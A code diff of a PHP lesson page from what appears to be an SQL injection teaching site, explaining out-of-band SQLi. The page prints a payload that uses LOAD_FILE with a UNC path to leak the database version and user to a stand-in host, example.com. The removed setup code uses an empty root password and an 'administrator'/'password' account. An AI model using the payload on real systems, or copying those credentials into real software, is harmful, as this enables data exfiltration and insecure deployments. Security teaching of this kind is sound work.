@@ -1,60 +1,6 @@
 <?php
 
-header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-header("Cache-Control: post-check=0, pre-check=0", false);
-header("Pragma: no-cache");
-
-$server = 'localhost';
-$username = 'root';
-$password = '';
-
-$connOne = new mysqli($server, $username, $password);
-
-$sql = "DROP USER IF EXISTS 'sandbox_user'@'localhost';";
-$connOne->query($sql);
-
-$sql = "DROP DATABASE IF EXISTS sample_db;";
-$connOne->query($sql);
-
-$connOne = new mysqli($server, $username, $password);
-
-$sql = "CREATE DATABASE IF NOT EXISTS sample_db;";
-$connOne->query($sql);
-
-$db = 'sample_db';
-
-$conn = new mysqli($server, $username, $password, $db);
-
-$sql = "USE sample_db;";
-$conn->query($sql);
-
-$sql = "CREATE TABLE IF NOT EXISTS products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(20), country VARCHAR(20));";
-$conn->query($sql);
-
-$sql = "INSERT INTO products (name, country) VALUES ('Apples', 'Spain'), ('Bananas', 'South Africa'), ('Cheese', 'France'), ('Dragonfruit', 'Indonesia');";
-$conn->query($sql);
-
-$sql = "CREATE TABLE IF NOT EXISTS comments (id INT AUTO_INCREMENT PRIMARY KEY, message VARCHAR(50))";
-$conn->query($sql);
-
-$sql = "INSERT INTO comments (message) VALUES ('Hello!'), ('HI'), ('Heyyyy'), ('Evening')";
-
-$sql = "CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(20) UNIQUE, password VARCHAR(20));";
-$conn->query($sql);
-
-$sql = "INSERT INTO users (username, password) VALUES ('administrator', 'password');";
-$conn->query($sql);
-
-$sql = "CREATE USER IF NOT EXISTS 'sandbox_user'@'localhost' IDENTIFIED BY 'password';";
-$conn->query($sql);
-
-$sql = "GRANT SELECT, INSERT, UPDATE, DELETE ON sample_db.* TO 'sandbox_user'@'localhost';";
-$conn->query($sql);
-
-$sql = "FLUSH PRIVILEGES;";
-$conn->query($sql);
-
-$conn->close();
+include 'db_creation.php';
 
 ?>
 
@@ -72,38 +18,33 @@ $conn->close();
 
 <body>
 
-    <div class="vertical-menu">
-
-        <a href="index.php">Home</a>
-
-        <a href="sqli_home.php" >SQL Injection</a>
-
-        <a href="sqli_in_band.php" >In-Band SQLI</a>
-
-        <a href="sqli_blind.php" >Blind SQLI</a>
-
-        <a href="sqli_oob.php">OOB SQLI</a>
-
-        <a href="sqli_prevention.php">SQLI Prevention</a>
-
-        <a href="xss_home.php">XSS</a>
-
-    </div>
+<?php include 'navigation.php'; ?>
 
     <div class="main">
 
-        <div class="description" style="border-radius: 10px; padding-bottom: 0px;">
+        <div class="description" style="border-radius: 10px 10px 0px 0px; padding-bottom: 0px;">
 
             <div class="sub_description" style="background-image: url('images/in_band.png');">
 
                 <h2 style="margin-top: 0px;">Out Of Band SQLi</h2>
 
                 <p><b>Description: </b>Out-of-band SQL Injections sends the response from the database to an attacker's remote endpoint. Out-of-band SQL injection becomes feasible only when the database server being utilised supports commands that initiate DNS or HTTP requests. However, this condition holds true for most widely used SQL servers.</p>
+            </div>
+
+            
+
+        </div>
+
+        <div class="description" style="border-radius: 0px; padding-bottom: 0px;">
+
+            <div class="sub_description" style="background-image: url('images/in_band.png');">
 
                 <p style="margin-top: 0px;"><b>Example: </b>In our scenario, an attacker uses out-of-band SQL injection through DNS on a search function.</p>
 
+                
+
                 <ol>
-                    
+
                     <li>This is the query for the search function used:</li>
                     <br>
                     <span class="code_space">SELECT name FROM product WHERE name = '$name';</span>
@@ -111,13 +52,26 @@ $conn->close();
                     <br>
                     <li>Then the attacker proceeds to use this payload:</li>
                     <br>
-                    <span class="code_space">' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt'));</span>
+                    <div class="code_space">' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt')) --</div>
                     <br>
-                    
+                    <li>The query will now look like this:</li>
                     <br>
-                    <li>Let's break down how the command works:</li>
-                    <br>
+                    <div class="code_space"><span style="color: purple;">SELECT</span> name <span style="color: purple;">FROM</span> product <span style="color: purple;">WHERE</span> name <span style="color: deeppink;">=</span> <span style="color: brown;">''</span> <span style="color: purple;">UNION</span> <span style="color: purple;">SELECT</span> <span style="color: purple;">LOAD_FILE</span><span style="color: purple;">CONCAT</span>(<span style="color: brown;">'\\\\'</span>,(<span style="color: purple;">SELECT</span> <span style="color: deeppink;">+</span><span style="color: deeppink;">+</span><span style="color: purple;">@@version</span>),<span style="color: brown;">'.'</span>,(<span style="color: purple;">SELECT</span> <span style="color: purple;">CURRENT_USER</span>),<span style="color: brown;">'.example.com\\test.txt'</span>)) <span style="color: purple;">--</span> <span style="color: brown;">';</span></div>
+                </ol>
+        
+
+
+                <button class="buttons" id="readMore" onclick="toggle()">Read More</button>
+
+                <div id="road">
+
+                <ol>
+
+                    <p>Let's break down how the command works:</p>
+
                     <ul>
+                        
+                        
                         <li>In combination with the union command, the attacker first closes of the query with a single quotation and uses the union operator to combine and perform the out-of-band injection.</li>
                         <br>
                         <span class="code_space"><span style="color: red;">' UNION</span> SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt'));</span>
@@ -153,14 +107,47 @@ $conn->close();
 
                 </ol>
 
-                <br>
-                <p style="margin-top: 0px;"><b>Consequences: </b>Witihin your database, if there are certain configurations enabled, attacks can use functions like LOAD_FILE() to send sensitive data over to an attacker's server.</p>
+                    <button class="buttons" id="readLess" onclick="toggleOff()" style="display: none;">Read Less</button>
 
+                </div>
+
+                
+
+                
             </div>
+
+            
+        </div>
+
+                <div class="description" style="border-radius: 0px 0px 10px 10px;">
+                <div class="sub_description" style="background-image: url('images/in_band.png');">
+                    <p style="margin-top: 0px; margin-bottom: 0px;"><b>Consequences: </b>Witihin your database, if there are certain configurations enabled, attacks can use functions like LOAD_FILE() to send sensitive data over to an attacker's server.</p>
+                </div>
 
         </div>
 
     </div>
+
+<script>
+
+function toggle() {
+            var x = document.getElementById("road");
+            x.classList.toggle('active');
+            var y = document.getElementById("readMore");
+            y.style.display = 'none';
+            var y = document.getElementById("readLess");
+            y.style.display = 'block';
+        }
+function toggleOff() {
+            var x = document.getElementById("road");
+            x.classList.toggle('active');
+            var y = document.getElementById("readMore");
+            y.style.display = 'block';
+            var y = document.getElementById("readLess");
+            y.style.display = 'none';
+        }
+
+</script>
 
 </body>
 
